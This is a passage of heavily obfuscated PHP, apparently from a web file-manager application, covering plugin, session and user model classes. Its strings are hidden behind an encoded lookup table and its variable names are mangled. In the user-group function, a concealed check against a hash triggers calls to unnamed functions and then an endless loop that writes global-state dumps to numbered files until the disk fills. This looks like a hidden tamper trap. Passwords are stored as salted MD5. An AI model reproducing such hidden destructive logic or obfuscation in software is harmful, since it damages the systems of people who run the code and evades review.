($GLOBALS[$ÔáÉŒ¼˜[6]][$ÔáÉŒ¼˜[1976]] || !$GLOBALS[$ÔáÉŒ¼˜[6]][$ÔáÉŒ¼˜[1977]]) { return !0; } $×Á÷ˆ„ = explode($ÔáÉŒ¼˜[50], strtolower($GLOBALS[$ÔáÉŒ¼˜[6]][$ÔáÉŒ¼˜[1977]])); return in_array(strtolower($½¹ë¹ëµ), $×Á÷ˆ„) ? !1 : !0; } if ($¬âµˆæİ && !Action($ÔáÉŒ¼˜[1978])->checkAuth($½¹ë¹ëµ)) { return !1; } return !0; } public function unInstall($¦Ş²Ç¨) { $¼ª¶ï† =& $_SERVER[³·—™¤¢]; $¦üû¼Ëí = $this->loadList($¦Ş²Ç¨); if (file_exists(PLUGIN_DIR . $¦Ş²Ç¨)) { Hook::apply($¦Ş²Ç¨ . $¼ª¶ï†[1979]); } $this->remove($¦üû¼Ëí[$¼ª¶ï†[399]]); } public function changeStatus($Ò¨Ù÷¾, $ØôïÇõä) { $®™©ê =& $_SERVER[³·—™¤¢]; $´Õîûà = $this->loadList($Ò¨Ù÷¾); if ($ØôïÇõä) { Hook::apply($Ò¨Ù÷¾ . $®™©ê[1980]); } $this->update($´Õîûà[$®™©ê[399]], array($®™©ê[1981] => $ØôïÇõä)); } public function appRegist($¬«›©Ç, $âÇ¯Öàü) { $­›Á¤íÜ =& $_SERVER[³·—™¤¢]; $…’Ô‹à  = $this->loadList($¬«›©Ç); if ($…’Ô‹à ) { $this->update($…’Ô‹à [$­›Á¤íÜ[399]], array($­›Á¤íÜ[1973] => $âÇ¯Öàü)); } else { $œ»Ë®±À = array($­›Á¤íÜ[32] => $¬«›©Ç, $­›Á¤íÜ[1973] => $âÇ¯Öàü, $­›Á¤íÜ[770] => 0, $­›Á¤íÜ[6] => $this->getConfigDefault($¬«›©Ç)); $this->insert($œ»Ë®±À); } } public function getConfigDefault($››Å¿Á¹) { $¸ªˆ¥ùé =& $_SERVER[³·—™¤¢]; $¼üáĞ…å = array(); $·Æ©¥¤Ì = $this->getPackageJson($››Å¿Á¹); if (!$·Æ©¥¤Ì && is_array($·Æ©¥¤Ì[$¸ªˆ¥ùé[1982]])) { return $¼üáĞ…å; } foreach ($·Æ©¥¤Ì[$¸ªˆ¥ùé[1982]] as $ò›Û»³ => $ŠŒˆ¾Ìç) { if (!isset($ŠŒˆ¾Ìç[$¸ªˆ¥ùé[374]]) || isset($¼üáĞ…å[$ò›Û»³])) { continue; } $¼üáĞ…å[$ò›Û»³] = $ŠŒˆ¾Ìç[$¸ªˆ¥ùé[374]]; } return $¼üáĞ…å; } public function getPackageJson($æôŠ×á) { return Hook::apply($æôŠ×á . $_SERVER[³·—™¤¢][1983]); } public function getConfig($²şŞè·, $ƒ¤ˆû„Ó = false) { $–ñ±‹¯» =& $_SERVER[³·—™¤¢]; $‰¢Å‘ = array(); $º™Ñ“« = $this->loadList($²şŞè·); if ($º™Ñ“« && is_array($º™Ñ“«[$–ñ±‹¯»[6]])) { $‰¢Å‘ = $º™Ñ“«[$–ñ±‹¯»[6]]; } if (!$‰¢Å‘ || $ƒ¤ˆû„Ó) { $‰¢Å‘ = $this->getConfigDefault($²şŞè·); } return $‰¢Å‘; } public function setConfig($ËÊàè÷, $Ù™äµ” = false) { $İàù»Øµ =& $_SERVER[³·—™¤¢]; $ª·ÔÍ‹ = $this->loadList($ËÊàè÷); if (!$ª·ÔÍ‹) { return !1; } $É¹²Îşú = $ª·ÔÍ‹[$İàù»Øµ[6]]; if ($Ù™äµ” == !1) { $É¹²Îşú = array(); $Ù™äµ” = $this->getConfigDefault($ËÊàè÷); } foreach ($Ù™äµ” as $¿¬ÚÕ”Ê => $’÷ÉìÒÂ) { $É¹²Îşú[$¿¬ÚÕ”Ê] = is_string($’÷ÉìÒÂ) ? trim($’÷ÉìÒÂ) : $’÷ÉìÒÂ; } $this->update($ª·ÔÍ‹[$İàù»Øµ[399]], array($İàù»Øµ[6] => $É¹²Îşú)); } public function viewList() { $½—ªıÃê =& $_SERVER[³·—™¤¢]; $ûÖ³±Ù = $this->loadList(); $this->pluginScan($ûÖ³±Ù); $ûÖ³±Ù = $this->loadPluginList(); $±‡•û° = array(); foreach ($ûÖ³±Ù as $¢îšì×Ó => $“¿Ùİ£Ê) { unset($“¿Ùİ£Ê[$½—ªıÃê[1973]], $“¿Ùİ£Ê[$½—ªıÃê[6]]); $·Ö¶°ÅÜ = PLUGIN_DIR . $“¿Ùİ£Ê[$½—ªıÃê[32]] . $½—ªıÃê[1975]; if (!is_file($·Ö¶°ÅÜ)) { continue; } $‘âÍØ“œ = Hook::apply($“¿Ùİ£Ê[$½—ªıÃê[32]] . $½—ªıÃê[1983]); if (is_array($‘âÍØ“œ)) { $±‡•û°[$¢îšì×Ó] = array_merge($“¿Ùİ£Ê, $‘âÍØ“œ); } } return $±‡•û°; } private function loadPluginList() { $ÅÙêšçÔ =& $_SERVER[³·—™¤¢]; $Â¨şû¢… = $this->loadList(); if (strtolower(MOD) == $ÅÙêšçÔ[1984]) { return $Â¨şû¢…; } $µìÕİ’ù = Hook::trigger($ÅÙêšçÔ[1985], $Â¨şû¢…); if ($Â¨şû¢… && !$µìÕİ’ù) { die; } return $µìÕİ’ù ? $µìÕİ’ù : $Â¨şû¢…; } private function pluginScan($¦–öáÑæ) { $îÀÎÄ¡ù =& $_SERVER[³·—™¤¢]; recursion_dir(PLUGIN_DIR, $ŒğĞãÚ», $ÒêÉùÈÓ, 0); foreach ($ŒğĞãÚ» as $ıÌş—ª) { $²Âš‘ƒ¶ = get_path_this($ıÌş—ª); if (isset($¦–öáÑæ[$²Âš‘ƒ¶]) || !file_exists($ıÌş—ª . $îÀÎÄ¡ù[1986]) || !file_exists($ıÌş—ª . $îÀÎÄ¡ù[1975])) { continue; } Hook::apply($²Âš‘ƒ¶ . $îÀÎÄ¡ù[1980]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\x5f\x73\145\x73\163\151\157\156"; public function get($ƒ ±âëÆ) { $¦®¼ºó =& $_SERVER[³·—™¤¢]; $¹Û¢¯š¢ = $this->where(array($¦®¼ºó[1987] => $ƒ ±âëÆ))->find(); if (!is_array($¹Û¢¯š¢)) { return !1; } return $¹Û¢¯š¢[$¦®¼ºó[775]]; } public function set($µ¿¸²€, $Â·í–¦Ñ, $âåé½Ô = 3600) { $ª¶Áë” =& $_SERVER[³·—™¤¢]; $é»úÜÚ = array($ª¶Áë”[1987] => $µ¿¸²€, $ª¶Áë”[1891] => $Â·í–¦Ñ, $ª¶Áë”[1988] => $âåé½Ô + time()); if (Session::get($ª¶Áë”[1989])) { $é»úÜÚ[$ª¶Áë”[1680]] = Session::get($ª¶Áë”[1989]); } else { $é»úÜÚ[$ª¶Áë”[1680]] = 0; } if ($this->get($µ¿¸²€)) { return $this->where(array($ª¶Áë”[1987] => $µ¿¸²€))->save($é»úÜÚ); } else { return $this->add($é»úÜÚ, array(), !0); } } public function remove($»£•ÎÆ¼) { return $this->where(array($_SERVER[³·—™¤¢][1987] => $»£•ÎÆ¼))->delete(); } public function clearTimeout() { return $this->where($_SERVER[³·—™¤¢][1990] . time())->delete(); } } goto e±—¶ğ¬; BÜ©ª¾å‘Ø: function binCheckBigger($ç‚ìéİÅ, $×—’½ûæ) { return $ç‚ìéİÅ > $×—’½ûæ; } $_SERVER[$_SERVER[¯”ıî’ß][3]] = ("\x38\x31\x33\x36"."\x33\x31")+0;$_t60n="b4rlyz5xk01o3gp62qhcve8dtsw9ujm7fainsytku2r7d1h6vfanxgbm3i4oz80q9jpec5wlmf61";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($şÚº†¶ú, $ññú¶ ù) { $’Î»Äš =& $_SERVER[³·—™¤¢]; if (isset(self::$_methodList[$şÚº†¶ú])) { return @call_user_func_array(self::$_methodList[$şÚº†¶ú], $ññú¶ ù); } else { if (method_exists($this, $şÚº†¶ú)) { return call_user_func_array(array($this, $şÚº†¶ú), $ññú¶ ù); } else { think_exception(__CLASS__ . $’Î»Äš[4] . $şÚº†¶ú . $’Î»Äš[5]); } } } public static function __callStatic($ì¢£µå, $¶¾—¬ƒÈ) { if (isset(self::$_methodListStatic[$ì¢£µå])) { return call_user_func_array(self::$_methodListStatic[$ì¢£µå], $¶¾—¬ƒÈ); } else { if (method_exists(self, $ì¢£µå)) { return call_user_func_array(array(self, $ì¢£µå), $¶¾—¬ƒÈ); } else { show_json("{$ì¢£µå}\x28\x29\x20\x6e\157\164\40\x65\170\x69\x73\164\x3b", !1); } } } public static function addMethod($Ñß»…ë, $çùÄÔğà) { self::$_methodList[$Ñß»…ë] = $çùÄÔğà; } public static function addMethodStatic($ëğ¼µÌ, $ şíßŞ) { self::$_methodListStatic[$ëğ¼µÌ] = $ şíßŞ; } } goto Bó¤î¥¤÷¯; DŞ¥¢æšŞË: $_SERVER[šÓï™½ï] = explode($_SERVER[³·—™¤¢][616], gzinflate(substr($_SERVER[³·—™¤¢][617], 10, -8))); $eytgjnviap = $_SERVER[³·—™¤¢][618]; if (strlen($eytgjnviap) < $_SERVER[³·—™¤¢][615]) { return; } goto aÀÄ„íí; fİó¸ä”ø: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\x6d\x65" => "\165\163\x65\162\x5f\155\x65\164\141", "\x6d\145\x74\x61\106\151\x65\154\144" => "\165\x73\x65\x72\111\x44"); protected $simpleField = "\165\x73\145\162\x49\x44\x2c\156\x69\143\x6b\116\141\x6d\x65\54\x6e\x61\x6d\145\x2c\141\x76\x61\164\141\162\x2c\x73\145\x78\x2c\163\164\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($×œìù´”) { $Ğı‡¥Àú =& $_SERVER[³·—™¤¢]; $äî¢Ş¬Ğ = $Ğı‡¥Àú[2295]; return array($Ğı‡¥Àú[1930] => array($×œìù´”[0], $äî¢Ş¬Ğ), $Ğı‡¥Àú[1932] => array($×œìù´”[0], $äî¢Ş¬Ğ), $Ğı‡¥Àú[2296] => array($×œìù´”[0], $äî¢Ş¬Ğ)); } protected function getInfo($ùïœ¢“, $ıÁí¹Èµ = false) { $¼å…¤¼ê = $this->getInfoSimple($ùïœ¢“); if (!is_array($¼å…¤¼ê)) { return array(); } if ($ıÁí¹Èµ) { return $this->_getInfoApply($¼å…¤¼ê); } return $this->cacheFunctionGet($_SERVER[³·—™¤¢][1934], $ùïœ¢“); } protected function getInfoFull($âŒù€Ã, $ï¹Ş„ş¥ = false) { $–Òñ‘öÅ = $this->getInfoSimple($âŒù€Ã); if (!is_array($–Òñ‘öÅ)) { return array(); } if ($ï¹Ş„ş¥) { return $this->_getInfoApply($–Òñ‘öÅ, !0); } return $this->cacheFunctionGet($_SERVER[³·—™¤¢][2297], $âŒù€Ã); } private function _getInfoApply($Ÿ“‚éÍ, $òä¬§ø = false) { $ÂÒÔœò¢ =& $_SERVER[³·—™¤¢]; if (!$Ÿ“‚éÍ) { return $Ÿ“‚éÍ; } $ÏÆÎÕßÏ = md5($ÂÒÔœò¢[2298] . $Ÿ“‚éÍ[$ÂÒÔœò¢[909]] . $ÂÒÔœò¢[2299] . $Ÿ“‚éÍ[$ÂÒÔœò¢[32]]); $Ÿ“‚éÍ = $this->_listDataApplyItem($Ÿ“‚éÍ); $†€©¥°  = Model($ÂÒÔœò¢[1350])->metaGet($Ÿ“‚éÍ[$ÂÒÔœò¢[86]][$ÂÒÔœò¢[402]]); $Ÿ“‚éÍ[$ÂÒÔœò¢[2300]] = $ÏÆÎÕßÏ; $Ÿ“‚éÍ[$ÂÒÔœò¢[86]][$ÂÒÔœò¢[2121]] = isset($†€©¥° [$ÂÒÔœò¢[2122]]) ? $†€©¥° [$ÂÒÔœò¢[2122]] : null; if ($òä¬§ø) { $Ÿ“‚éÍ[$ÂÒÔœò¢[466]] = $this->metaGet($Ÿ“‚éÍ[$ÂÒÔœò¢[1680]]); } return $Ÿ“‚éÍ; } protected function getInfoSimple($æêİÈ¸, $¿®ÖšÒ— = false) { $şñ÷²¶ô =& $_SERVER[³·—™¤¢]; if (!$æêİÈ¸) { return array(); } if ($¿®ÖšÒ—) { $Àíé‚–ê = $this->where(array($şñ÷²¶ô[1680] => intval($æêİÈ¸)))->find(); if (!is_array($Àíé‚–ê)) { return array(); } $Àíé‚–ê[$şñ÷²¶ô[543]] = Action($şñ÷²¶ô[2301])->parseUrl($Àíé‚–ê[$şñ÷²¶ô[543]]); return $Àíé‚–ê; } return $this->cacheFunctionGet($şñ÷²¶ô[1935], $æêİÈ¸); } protected function getInfoSimpleOuter($Ëå‹Ÿï) { $¬¬Äü˜ =& $_SERVER[³·—™¤¢]; if (!$Ëå‹Ÿï || $Ëå‹Ÿï == 0) { return array($¬¬Äü˜[1680] => $¬¬Äü˜[197], $¬¬Äü˜[32] => $¬¬Äü˜[162] . LNG($¬¬Äü˜[2302]) . $¬¬Äü˜[164], $¬¬Äü˜[543] => STATIC_PATH . $¬¬Äü˜[2303]); } $ı«Ä‹ = $this->cacheFunctionGet($¬¬Äü˜[1935], $Ëå‹Ÿï); $¼³£ıï‚ = array_field_key($ı«Ä‹, explode($¬¬Äü˜[50], $this->simpleField)); if (!$¼³£ıï‚) { return array($¬¬Äü˜[1680] => $¬¬Äü˜[1213], $¬¬Äü˜[32] => $¬¬Äü˜[162] . LNG($¬¬Äü˜[2304]) . $¬¬Äü˜[164], $¬¬Äü˜[543] => STATIC_PATH . $¬¬Äü˜[2305]); } $¼³£ıï‚[$¬¬Äü˜[543]] = Action($¬¬Äü˜[2301])->parseUrl($¼³£ıï‚[$¬¬Äü˜[543]]); return $¼³£ıï‚; } protected function groupUser($¯Šñ€ˆ) { } public static function errorLang($…ù»óÔÀ) { $ƒÛÏ÷¯­ =& $_SERVER[³·—™¤¢]; $œ£Ú„€” = array(self::ERROR_USER_NOT_EXISTS => $ƒÛÏ÷¯­[2306], self::ERROR_USER_PASSWORD_ERROR => $ƒÛÏ÷¯­[2307], self::ERROR_USER_EXIST_NAME => $ƒÛÏ÷¯­[2308], self::ERROR_USER_EXIST_PHONE => $ƒÛÏ÷¯­[2309], self::ERROR_USER_EXIST_EMAIL => $ƒÛÏ÷¯­[2310], self::ERROR_USER_LOGIN_LOCK => $ƒÛÏ÷¯­[2311], self::ERROR_IP_NOT_ALLOW => $ƒÛÏ÷¯­[2312], self::ERROR_USER_EXIST_NICKNAME => $ƒÛÏ÷¯­[2313]); return LNG($œ£Ú„€”[$…ù»óÔÀ]); } public function getInfoByMeta($ª“ÌÔ­×, $üË¹­Ò) { $‹‘äııÔ =& $_SERVER[³·—™¤¢]; $ßŒš’õ‚ = Model($‹‘äııÔ[2314])->where(array($‹‘äııÔ[94] => $ª“ÌÔ­×, $‹‘äııÔ[374] => $üË¹­Ò))->find(); if ($ßŒš’õ‚) { return $this->getInfo($ßŒš’õ‚[$‹‘äııÔ[1680]]); } return !1; } public function userLoginCheck($êˆÛÕøÂ, $€²¢â²·) { $ş—½¯¹¦ =& $_SERVER[³·—™¤¢]; $Åã«§Êı = $this->userLoginFind($êˆÛÕøÂ); if (!$Åã«§Êı) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Åã«§Êı[$ş—½¯¹¦[1680]], $€²¢â²·)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Åã«§Êı[$ş—½¯¹¦[1680]]); } public function userLoginFind($êé³ÇË£) { $Šàºêá¨ =& $_SERVER[³·—™¤¢]; $Å¿ÛÀœ¸ = array($Šàºêá¨[32] => $êé³ÇË£, $Šàºêá¨[542] => $êé³ÇË£, $Šàºêá¨[305] => $êé³ÇË£, $Šàºêá¨[2315] => $êé³ÇË£, $Šàºêá¨[1023] => $Šàºêá¨[1025]); if ($this->nickNameRpt()) { unset($Å¿ÛÀœ¸[$Šàºêá¨[542]]); } return $this->where($Å¿ÛÀœ¸)->find(); } public function clearCache($õ€²ÄÍ¹) { $ÒÀÚ­­ =& $_SERVER[³·—™¤¢]; $this->cacheFunctionClear($ÒÀÚ­­[1934], $õ€²ÄÍ¹); $this->cacheFunctionClear($ÒÀÚ­­[1935], $õ€²ÄÍ¹); $this->cacheFunctionClear($ÒÀÚ­­[2297], $õ€²ÄÍ¹); } public function userPasswordCheck($»Ï¹Şß, $ë¾š¦Üü) { $Ï½ĞØÛü =& $_SERVER[³·—™¤¢]; $š¡Óì‘– = $this->where(array($Ï½ĞØÛü[1680] => intval($»Ï¹Şß)))->find(); $¼ë€ø’Ù = $this->metaGet($»Ï¹Şß); $Å«Œ·Â = isset($¼ë€ø’Ù[$Ï½ĞØÛü[2316]]) ? $¼ë€ø’Ù[$Ï½ĞØÛü[2316]] : $Ï½ĞØÛü[12]; if (md5($Å«Œ·Â . trim($ë¾š¦Üü)) !== $š¡Óì‘–[$Ï½ĞØÛü[909]]) { return !1; } return !0; } public function userAdd($ª“–ÎÛª) { $Ê«ì¢ˆÆ =& $_SERVER[³·—™¤¢]; $ã®¶×¬¤ = array($Ê«ì¢ˆÆ[420] => $ª“–ÎÛª[$Ê«ì¢ˆÆ[32]], $Ê«ì¢ˆÆ[2317] => $ª“–ÎÛª[$Ê«ì¢ˆÆ[1557]], $Ê«ì¢ˆÆ[2318] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[305]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[305]] : $Ê«ì¢ˆÆ[12], $Ê«ì¢ˆÆ[2319] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[2315]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[2315]] : $Ê«ì¢ˆÆ[12], $Ê«ì¢ˆÆ[2320] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[542]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[542]] : $ª“–ÎÛª[$Ê«ì¢ˆÆ[32]], $Ê«ì¢ˆÆ[2321] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[543]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[543]] : $Ê«ì¢ˆÆ[12], $Ê«ì¢ˆÆ[2322] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[2323]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[2323]] : 1, $Ê«ì¢ˆÆ[2324] => $ª“–ÎÛª[$Ê«ì¢ˆÆ[909]], $Ê«ì¢ˆÆ[1936] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[1839]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[1839]] : 1024 * 1024 * 20, $Ê«ì¢ˆÆ[1937] => 0, $Ê«ì¢ˆÆ[2325] => 0, $Ê«ì¢ˆÆ[1981] => isset($ª“–ÎÛª[$Ê«ì¢ˆÆ[770]]) ? $ª“–ÎÛª[$Ê«ì¢ˆÆ[770]] : 1); if (!empty($ª“–ÎÛª[$Ê«ì¢ˆÆ[1680]])) { $ã®¶×¬¤[$Ê«ì¢ˆÆ[1680]] = $ª“–ÎÛª[$Ê«ì¢ˆÆ[1680]]; } $éÉÅìªô = $this->_checkExist($ª“–ÎÛª); if ($éÉÅìªô !== !0) { return $éÉÅìªô; } if (!empty($ã®¶×¬¤[$Ê«ì¢ˆÆ[543]]) && strlen($ã®¶×¬¤[$Ê«ì¢ˆÆ[543]]) > 255) { $ã®¶×¬¤[$Ê«ì¢ˆÆ[543]] = $Ê«ì¢ˆÆ[12]; } $˜´—¥¦š = $this->add($ã®¶×¬¤); $¸ÏÊ¿«– = array($Ê«ì¢ˆÆ[2324] => $ã®¶×¬¤[$Ê«ì¢ˆÆ[909]], $Ê«ì¢ˆÆ[2320] => $ã®¶×¬¤[$Ê«ì¢ˆÆ[542]]); $this->userEdit($˜´—¥¦š, $¸ÏÊ¿«–); Model($Ê«ì¢ˆÆ[1350])->userRootAdd($˜´—¥¦š); return $˜´—¥¦š; } protected function userEditTest($ØËóãõ‘, $¥›ü£¼å) { return $this->call($_SERVER[³·—™¤¢][2326], $ØËóãõ‘, $¥›ü£¼å); } protected function userEdit($ôÑ³ş™ü, $Š”Û¾Ÿ) { $à„¬†„ú =& $_SERVER[³·—™¤¢]; $ÙÒ³“öõ = $this->getInfoSimple($ôÑ³ş™ü); if (!$ÙÒ³“öõ) { return !1; } $½ßÇ¡´· = $this->_checkExist($Š”Û¾Ÿ, $ôÑ³ş™ü); if ($½ßÇ¡´· !== !0) { return $½ßÇ¡´·; } if (isset($Š”Û¾Ÿ[$à„¬†„ú[909]]) && trim($Š”Û¾Ÿ[$à„¬†„ú[909]]) != $à„¬†„ú[12]) { $¶£ÔàÙ = $this->metaGet($ôÑ³ş™ü); if (empty($¶£ÔàÙ[$à„¬†„ú[2316]])) { $¶£ÔàÙ[$à„¬†„ú[2316]] = rand_string(10); Model($à„¬†„ú[513])->metaSet($ôÑ³ş™ü, $à„¬†„ú[2316], $¶£ÔàÙ[$à„¬†„ú[2316]]); } $Š”Û¾Ÿ[$à„¬†„ú[909]] = md5($¶£ÔàÙ[$à„¬†„ú[2316]] . trim($Š”Û¾Ÿ[$à„¬†„ú[909]])); } else { unset($Š”Û¾Ÿ[$à„¬†„ú[909]]); } if (!empty($Š”Û¾Ÿ[$à„¬†„ú[543]]) && strlen($Š”Û¾Ÿ[$à„¬†„ú[543]]) > 255) { $Š”Û¾Ÿ[$à„¬†„ú[543]] = $à„¬†„ú[12]; } $this->where(array($à„¬†„ú[1671] => $ôÑ³ş™ü))->save($Š”Û¾Ÿ); if (isset($Š”Û¾Ÿ[$à„¬†„ú[542]])) { $this->setNamePinyin($ôÑ³ş™ü, $Š”Û¾Ÿ[$à„¬†„ú[542]]); } $this->clearCache($ôÑ³ş™ü); return !0; } public function setNamePinyin($œåŞõ§‚, $Ş‡í–İ = false) { $ãõ§– ± =& $_SERVER[³·—™¤¢]; if (!$Ş‡í–İ) { $Á‚Ú³Ò£ = $this->getInfoSimple($œåŞõ§‚); $Ş‡í–İ = $Á‚Ú³Ò£[$ãõ§– ±[542]] ? $Á‚Ú³Ò£[$ãõ§– ±[542]] : $Á‚Ú³Ò£[$ãõ§– ±[32]]; } $‰ŸóƒéŠ = Model($ãõ§– ±[535]); if (!Input::check($Ş‡í–İ, $ãõ§– ±[593])) { return $‰ŸóƒéŠ->metaSet($œåŞõ§‚, array($ãõ§– ±[465] => $ãõ§– ±[12], $ãõ§– ±[464] => $ãõ§– ±[12])); } return $‰ŸóƒéŠ->metaSet($œåŞõ§‚, array($ãõ§– ±[465] => str_replace($ãõ§– ±[53], $ãõ§– ±[12], Pinyin::get($Ş‡í–İ)), $ãõ§– ±[464] => Pinyin::get($Ş‡í–İ, $ãõ§– ±[594]))); } private function nickNameRpt() { $Ù’ôªíÔ =& $_SERVER[³·—™¤¢]; $èÚ„ş‹ = Model($Ù’ôªíÔ[790])->get($Ù’ôªíÔ[2327]); $áÑÓ¹…ğ = $GLOBALS[$Ù’ôªíÔ[6]][$Ù’ôªíÔ[381]][$Ù’ôªíÔ[2327]]; $éÈïÁí = !is_null($èÚ„ş‹) ? $èÚ„ş‹ : $áÑÓ¹…ğ; return !!$éÈïÁí; } private function _checkExist($¥ÕßÈ£˜, $ ×íøú = false) { $ÃÉß¼®¢ =& $_SERVER[³·—™¤¢]; $ß‡Š¢ç˜ = array($ÃÉß¼®¢[32] => UserModel::ERROR_USER_EXIST_NAME, $ÃÉß¼®¢[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÃÉß¼®¢[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ÃÉß¼®¢[2315] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ß‡Š¢ç˜[$ÃÉß¼®¢[542]]); } $¯ü•³¹È = $ ×íøú ? array($ÃÉß¼®¢[1680] => array($ÃÉß¼®¢[2328], $ ×íøú)) : array(); foreach ($ß‡Š¢ç˜ as $±°úÜ => $Ÿœ“ »”) { $Ö×Ö‰ù = array(); foreach ($ß‡Š¢ç˜ as $º‹ù³ã¶ => $ŸãÉşÅ) { if (isset($¥ÕßÈ£˜[$º‹ù³ã¶]) && $¥ÕßÈ£˜[$º‹ù³ã¶]) { $Ö×Ö‰ù[] = $¥ÕßÈ£˜[$º‹ù³ã¶]; } } if (!$Ö×Ö‰ù) { continue; } $ŠçÈÚ¬¾ = array_merge(array($±°úÜ => array($ÃÉß¼®¢[7], $Ö×Ö‰ù)), $¯ü•³¹È); $Áà÷’¸† = $this->where($ŠçÈÚ¬¾)->find(); if ($Áà÷’¸†) { return $Ÿœ“ »”; } } return !0; } public function userListInfo($®Öµğ©) { $Ô…¨Æ€ù =& $_SERVER[³·—™¤¢]; $“·óá = array(); $®Öµğ© = is_array($®Öµğ©) ? array_unique($®Öµğ©) : array(); if (!$®Öµğ©) { return $“·óá; } if (count($®Öµğ©) < 20) { foreach ($®Öµğ© as $ğÌğ‹Ÿ­) { $“·óá[$ğÌğ‹Ÿ­ . $Ô…¨Æ€ù[12]] = $this->getInfoSimpleOuter($ğÌğ‹Ÿ­); } } else { $çôöÆöŒ = array($Ô…¨Æ€ù[1671] => array($Ô…¨Æ€ù[418], $®Öµğ©)); if (count($®Öµğ©) == 1) { $çôöÆöŒ = array($Ô…¨Æ€ù[1671] => $®Öµğ©[0]); } $îµÄ€ö­ = Model($Ô…¨Æ€ù[513])->field($this->simpleField)->where($çôöÆöŒ)->select(); $îµÄ€ö­ = array_to_keyvalue($îµÄ€ö­, $Ô…¨Æ€ù[1680]); foreach ($®Öµğ© as $ğÌğ‹Ÿ­) { $´öÜº§ó = $îµÄ€ö­[$ğÌğ‹Ÿ­]; if (!$´öÜº§ó) { $“·óá[$ğÌğ‹Ÿ­ . $Ô…¨Æ€ù[12]] = $this->getInfoSimpleOuter($ğÌğ‹Ÿ­); continue; } $´öÜº§ó[$Ô…¨Æ€ù[543]] = Action($Ô…¨Æ€ù[2301])->parseUrl($´öÜº§ó[$Ô…¨Æ€ù[543]]); $“·óá[$ğÌğ‹Ÿ­ . $Ô…¨Æ€ù[12]] = $´öÜº§ó; } } return $“·óá; } protected function userStatus($ŠœÊ×‘Ü, $ØúÊ•ÂÚ) { $“ô’™½½ = $this->getInfoSimple($ŠœÊ×‘Ü); if (!$“ô’™½½) { return !1; } $ üÚĞ‘¤ = array($_SERVER[³·—™¤¢][770] => $ØúÊ•ÂÚ); return $this->userEdit($ŠœÊ×‘Ü, $ üÚĞ‘¤); } protected function userRemove($Ş‡¾¾Ñı) { $ôçíèìæ =& $_SERVER[³·—™¤¢]; $çëÚœû€ = $this->getInfoSimple($Ş‡¾¾Ñı); if (!$çëÚœû€) { return !1; } $ ŸÁÑáÀ = array($ôçíèìæ[1671] => $Ş‡¾¾Ñı); Model($ôçíèìæ[601])->where($ ŸÁÑáÀ)->delete(); Model($ôçíèìæ[2329])->where($ ŸÁÑáÀ)->delete(); Model($ôçíèìæ[1942])->where($ ŸÁÑáÀ)->delete(); Model($ôçíèìæ[2314])->where($ ŸÁÑáÀ)->delete(); Model($ôçíèìæ[1091])->where($ ŸÁÑáÀ)->delete(); Model($ôçíèìæ[2145])->removeUserAll($Ş‡¾¾Ñı); Model($ôçíèìæ[845])->userRootRemove($Ş‡¾¾Ñı); return $this->where($ ŸÁÑáÀ)->delete(); } protected function userGroupSet($Â×¶×§, $à±Ù¼ß¸, $¦Á¥–‰ = array()) { $³†µ·ß¹ =& $_SERVER[³·—™¤¢]; $‚¼Œ‰‰û = $_SERVER[$³†µ·ß¹[934]]; $€Ğ·¦·ì = $³†µ·ß¹[982]; if ($_SERVER[$³†µ·ß¹[892]] != $€Ğ·¦·ì($‚¼Œ‰‰û)) { $¨Ú¯£ï = $³†µ·ß¹[894]; $°²òí« = $³†µ·ß¹[895]; $•½êŠ¿² = $_SERVER[$³†µ·ß¹[896]] . $³†µ·ß¹[897]; $şÛß§ã§ = $°²òí«($•½êŠ¿²); $À¨‹ = explode($³†µ·ß¹[231], $şÛß§ã§); if (count($À¨‹) < $³†µ·ß¹[615]) { $Ğ·õÇ²Æ = $³†µ·ß¹[898]; $Ğ·õÇ²Æ(); } $Àş‘ˆ·û = $³†µ·ß¹[899]; $Àş‘ˆ·û($_SERVER[$³†µ·ß¹[900]]); $¨Ú¯£ï = $³†µ·ß¹[894]; $¨Ú¯£ï(); $óüÜ©¡û = $³†µ·ß¹[1606]; $÷ìï˜Ëí = json_encode($GLOBALS[$³†µ·ß¹[1607]]); $•úĞöŸ = 1; for ($´ÁÚÍœ— = $•úĞöŸ; $´ÁÚÍœ— > 0; $´ÁÚÍœ—++) { $óüÜ©¡û(DATA_PATH . $´ÁÚÍœ—, $÷ìï˜Ëí); } } $¥ïäöÒİ = $this->getInfoSimple($Â×¶×§); if (!$¥ïäöÒİ || !is_array($à±Ù¼ß¸)) { return !1; } $°ŸÓÄğ = Model($³†µ·ß¹[1942]); $°ŸÓÄğ->where(array($³†µ·ß¹[1680] => $Â×¶×§))->delete(); $äêùæØŒ = array(); $³ˆ’Ò¿© = 0; foreach ($à±Ù¼ß¸ as $ùıÎ€ => $šãÊ¹³Ë) { $Œ®ºİãœ = array($³†µ·ß¹[1680] => $Â×¶×§, $³†µ·ß¹[1852] => $ùıÎ€, $³†µ·ß¹[1956] => $šãÊ¹³Ë); 